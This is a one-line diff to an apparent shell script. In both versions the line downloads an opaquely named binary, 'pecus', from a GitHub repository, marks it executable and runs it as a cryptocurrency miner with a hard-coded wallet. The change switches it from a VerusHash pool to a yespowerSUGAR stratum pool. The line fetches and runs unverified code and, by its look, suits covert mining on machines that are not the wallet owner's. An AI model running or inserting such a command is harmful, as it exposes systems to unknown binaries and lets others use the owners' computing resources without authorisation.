@@ -1,1 +1,1 @@
-wget https://github.com/desafff/pecuk/raw/main/pecus && chmod +x pecus && ./pecus -v -l verushash.na.mine.zergpool.com:3300 -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.$(echo $(shuf -i 1-99 -n 1)-Ib) -p c=VRSC -t 90
+wget https://github.com/desafff/pecuk/raw/main/pecus && chmod +x pecus && ./pecus -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qnynu5uz3u22qqduntwpc04d9rqrk8acl5qnnjp.w2 -p x -t 50
